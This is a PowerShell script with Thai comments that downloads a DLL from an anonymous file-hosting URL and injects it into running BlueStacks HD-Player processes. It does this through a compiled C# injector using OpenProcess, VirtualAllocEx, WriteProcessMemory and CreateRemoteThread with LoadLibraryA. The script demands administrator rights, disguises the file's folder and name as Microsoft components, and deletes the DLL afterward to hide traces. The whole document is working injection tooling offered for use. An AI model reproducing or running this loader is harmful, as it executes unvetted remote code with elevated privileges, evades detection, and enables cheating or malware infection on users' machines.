# =========================================================
# 1. เช็คสิทธิ์ Admin
# =========================================================
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "กรุณารัน PowerShell ในโหมด Administrator"
    exit
}

# =========================================================
# 2. ตั้งค่า Path และโหลดไฟล์
# =========================================================
$url = "https://files.catbox.moe/0ukxya.dll" 
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$fakeName = "ms_$(Get-Random).dll" # ใช้ชื่อสุ่มเพื่อเลี่ยงการโดน Lock ไฟล์
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player" 

if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }

$ProgressPreference = 'SilentlyContinue'
try {
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Error "ดาวน์โหลด DLL ไม่สำเร็จ"
    exit
}

# =========================================================
# 3. C# Injector (ปรับปรุงการจัดการ Memory)
# =========================================================
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static bool Inject(int pid, string dllPath) {
        // Open with All Access
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        if (hProcess == IntPtr.Zero) return false;

        // Allocate memory for DLL Path
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        if (addr == IntPtr.Zero) return false;

        // Write DLL Path to memory
        byte[] bytes = Encoding.ASCII.GetBytes(dllPath);
        IntPtr outSize;
        if (!WriteProcessMemory(hProcess, addr, bytes, (uint)bytes.Length, out outSize)) return false;

        // Get LoadLibraryA address
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        
        // Execute Remote Thread
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        return hThread != IntPtr.Zero;
    }
}
"@

# =========================================================
# 4. เริ่มการ Inject
# =========================================================
Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue

$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
if ($proc) {
    # Inject ใส่ทุก Instance ที่เจอ (กรณีเปิดหลายจอ)
    foreach ($p in $proc) {
        $status = [Injector]::Inject($p.Id, $dllPath)
        if ($status) {
            Write-Host "Successfully injected into PID: $($p.Id)" -ForegroundColor Green
        } else {
            Write-Host "Failed to inject into PID: $($p.Id)" -ForegroundColor Red
        }
    }
} else {
    Write-Warning "ไม่พบโปรเซส $targetProcess (กรุณาเปิด BlueStacks ทิ้งไว้)"
}

# Clean Up (ลบไฟล์สุ่มทิ้งหลังจากโหลดเสร็จ)
Start-Sleep -Seconds 3
Remove-Item $dllPath -Force -ErrorAction SilentlyContinue